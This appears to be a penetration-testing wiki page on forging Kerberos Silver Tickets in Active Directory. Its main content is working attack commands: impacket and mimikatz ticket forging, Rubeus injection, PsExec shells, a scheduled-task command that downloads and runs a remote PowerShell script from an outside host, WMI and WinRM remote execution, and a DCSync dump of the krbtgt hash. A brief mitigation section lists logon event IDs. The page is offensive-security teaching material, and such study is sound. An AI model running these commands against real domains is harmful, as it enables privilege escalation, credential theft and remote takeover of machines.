# Silver Ticket

## Silver ticket

The Silver ticket attack is based on **crafting a valid TGS for a service once the NTLM hash of service is owned** \(like the **PC account hash**\). Thus, it is possible to **gain access to that service** by forging a custom TGS **as any user**.

In this case, the NTLM hash of a computer account \(which is kind of a user account in AD\) is owned. Hence, it is possible to craft a ticket in order to get into that machine with administrator privileges through the SMB service. The computer accounts reset their passwords every 30 days by default.

It also must be taken into account that it is possible to forge tickets using the AES Kerberos keys \(AES128 and AES256\). To know how to generate an AES key read: [section 4.4 of MS-KILE](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/936a4878-9462-4753-aac8-087cd3ca4625) or the [Get-KerberosAESKey.ps1](https://gist.github.com/Kevin-Robertson/9e0f8bfdbf4c1e694e6ff4197f0a4372).

{% code title="Linux" %}
```bash
python ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park -spn cifs/labwws02.jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache 
python psexec.py jurassic.park/stegosaurus@labwws02.jurassic.park -k -no-pass
```
{% endcode %}

In Windows, **Mimikatz** can be used to **craft** the **ticket**. Next, the ticket is **injected** with **Rubeus**, and finally a remote shell can be obtained thanks to **PsExec**.

{% code title="Windows" %}
```bash
#Create the ticket
mimikatz.exe "kerberos::golden /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /rc4:b18b4b218eccad1c223306ea1916885f /user:stegosaurus /service:cifs /target:labwws02.jurassic.park"
#Inject in memory using mimikatz or Rubeus
mimikatz.exe "kerberos::ptt ticket.kirbi"
.\Rubeus.exe ptt /ticket:ticket.kirbi
#Obtain a shell
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
{% endcode %}

The **CIFS** service is the one that allows you to **access the file system of the victim**. You can find other services here: [**https://adsecurity.org/?page\_id=183**](https://adsecurity.org/?page_id=183)**.** For example, you can use the **HOST service** to create a _**schtask**_ in a computer. Then you can check if this has worked trying to list the tasks of the victim: `schtasks /S <hostname>` or you can use the **HOST and** **RPCSS service** to execute **WMI** queries in a computer, test it doing: `Get-WmiObject -Class win32_operatingsystem -ComputerName <hostname>`

### Mitigation

Silver ticket events ID \(more stealth than golden ticket\):

* 4624: Account Logon
* 4634: Account Logoff
* 4672: Admin Logon

\*\*\*\*[**More information about Silver Tickets in ired.team**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)\*\*\*\*

## Available Services

<table>
  <thead>
    <tr>
      <th style="text-align:left">Service Type</th>
      <th style="text-align:left">Service Silver Tickets</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left">WMI</td>
      <td style="text-align:left">
        <p>HOST</p>
        <p>RPCSS</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">PowerShell Remoting</td>
      <td style="text-align:left">
        <p>HOST</p>
        <p>HTTP</p>
        <p>Depending on OS also:</p>
        <p>WSMAN</p>
        <p>RPCSS</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">WinRM</td>
      <td style="text-align:left">
        <p>HOST</p>
        <p>HTTP</p>
        <p>In some occasions you can just ask for: WINRM</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Scheduled Tasks</td>
      <td style="text-align:left">HOST</td>
    </tr>
    <tr>
      <td style="text-align:left">Windows File Share, also psexec</td>
      <td style="text-align:left">CIFS</td>
    </tr>
    <tr>
      <td style="text-align:left">LDAP operations, included DCSync</td>
      <td style="text-align:left">LDAP</td>
    </tr>
    <tr>
      <td style="text-align:left">Windows Remote Server Administration Tools</td>
      <td style="text-align:left">
        <p>RPCSS</p>
        <p>LDAP</p>
        <p>CIFS</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Golden Tickets</td>
      <td style="text-align:left">krbtgt</td>
    </tr>
  </tbody>
</table>

Using **Rubeus** you may **ask for all** these tickets using the parameter:

* `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

## Abusing Service tickets

In the following examples lets imagine that the ticket is retrieved impersonating the administrator account.

### CIFS

With this ticket you will be able to access the `C$` and `ADMIN$` folder via **SMB** \(if they are exposed\) and copy files to ay part of the remote filesystem just doing something like:

```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```

You will also be able to obtain a shell inside the host or execute arbitrary commands using **psexec**:

{% page-ref page="../ntlm/psexec-and-winexec.md" %}

### HOST

With this permission you can generate scheduled tasks in remote computers and execute arbitrary commands:

```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```

### HOST + RPCSS

With these tickets you can **execute WMI in the victim system**:

```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```

Find **more information about wmiexec** in the following page:

{% page-ref page="../ntlm/wmicexec.md" %}

### HOST + WSMAN \(WINRM\)

With winrm access over a computer you can **access it** and even get a PowerShell:

```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```

Check the following page to learn **more ways to connect with a remote host using winrm**:

{% page-ref page="../ntlm/winrm.md" %}

{% hint style="warning" %}
Note that **winrm must be active and listening** on the remote computer to access it.
{% endhint %}

### LDAP

With this privilege you can dump the DC database using **DCSync**:

```text
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```

**Learn more about DCSync** in the following page:

{% page-ref page="dcsync.md" %}

